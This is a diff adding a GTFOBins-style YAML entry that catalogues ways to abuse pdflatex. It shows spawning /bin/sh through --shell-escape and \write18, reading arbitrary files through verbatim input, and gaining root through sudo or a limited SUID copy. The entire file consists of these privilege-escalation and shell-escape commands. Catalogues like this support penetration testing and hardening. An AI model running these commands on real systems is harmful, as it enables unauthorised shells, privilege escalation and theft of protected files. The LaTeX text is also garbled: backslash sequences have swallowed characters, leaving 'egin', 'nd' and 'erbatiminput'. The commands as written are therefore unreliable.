@@ -1,0 +1,20 @@
+functions:
+shell:
+- code: |
+pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+file-read:
+- description: The read file will be part of the output.
+code: |
+pdflatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+pdftotext article.pdf -
+sudo:
+- description: The read file will be part of the output.
+code: |
+sudo pdflatex '\documentclass{article}\usepackage{verbatim}egin{document}erbatiminput{file_to_read}nd{document}'
+pdftotext article.pdf -
+- code: |
+sudo pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+limited-suid:
+- code: |
+./pdflatex --shell-escape '\documentclass{article}egin{document}\immediate\write18{/bin/sh}nd{document}'
+---
